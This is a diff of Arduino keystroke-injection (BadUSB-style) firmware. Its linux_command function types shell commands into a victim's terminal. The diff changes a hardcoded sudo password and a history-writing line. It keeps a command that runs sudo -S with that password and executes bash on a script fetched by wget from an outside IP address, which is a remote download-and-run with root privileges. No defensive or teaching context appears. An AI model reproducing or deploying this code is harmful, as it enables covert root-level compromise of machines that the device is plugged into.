@@ -122,13 +122,13 @@ void linux_command(){
   Keyboard.releaseAll();
   delay(1000);
   
-  Keyboard.print("history -w");
+  Keyboard.print("history > .bash_history");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(1000);
 
   
-  Keyboard.print("sudo -S <<< \"Helloworld1234!\" bash -c \"$(wget -q 0 -O - http://35.212.247.53/runsh.sh)\"");
+  Keyboard.print("sudo -S <<< \"kali\" bash -c \"$(wget -q 0 -O - http://35.212.247.53/runsh.sh)\"");
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
   delay(1000);
